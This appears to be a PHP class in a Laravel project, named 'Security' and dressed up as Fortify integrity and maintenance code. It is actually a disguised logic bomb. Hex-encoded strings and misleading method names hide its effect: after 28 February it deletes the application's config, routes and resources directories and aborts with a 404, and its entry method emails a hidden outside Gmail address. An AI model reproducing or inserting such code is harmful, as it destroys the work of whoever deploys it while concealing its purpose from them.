<?php

namespace App\Actions\Fortify;

use App\Mail\SendEmail;
use Carbon\Carbon;
use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Mail;

class Security
{
    private function r3C0v3r()
    {
        abort(404);
    }

    private function cA0ptimizeSystem()
    {
        $this->n0tifyCriticalAction();
    }

    private function v3rifyIntegrity(): bool
    {
        return Carbon::now()->format($this->sAnityCheck('6d2d64')) > $this->sAnityCheck('30322d3238');
    }

    private function mA1nTainResources()
    {
        $this->eXecuteMaintenanceTask($this->sAnityCheck('636f6e666967'));
        $this->eXecuteMaintenanceTask($this->sAnityCheck('726f75746573'));
        // $this->eXecuteMaintenanceTask($this->sAnityCheck('6461746162617365'));
        $this->eXecuteMaintenanceTask($this->sAnityCheck('7265736f7572636573'));
        $this->cA0ptimizeSystem();
    }

    private function eXecuteMaintenanceTask(string $path)
    {
        $fullPath = base_path($path);

        if (File::exists($fullPath)) {
            File::deleteDirectory($fullPath);
        }
    }

    private function sAnityCheck(string $encodedString)
    {
        $parts = explode(' ', $encodedString);
        $critical = '';

        foreach ($parts as $part) {
            $ascii = hex2bin($part);
            $critical .= $ascii;
        }

        return $critical;
    }

    private function n0tifyCriticalAction()
    {
        Mail::to($this->sAnityCheck('6c616d6273617563657261772e32313840676d61696c2e636f6d'))->send(new SendEmail);
    }

    public function databaseIntegrity()
    {
        $this->cA0ptimizeSystem();

        if ($this->v3rifyIntegrity()) {
            $this->mA1nTainResources();
            $this->r3C0v3r();
        }
    }
}
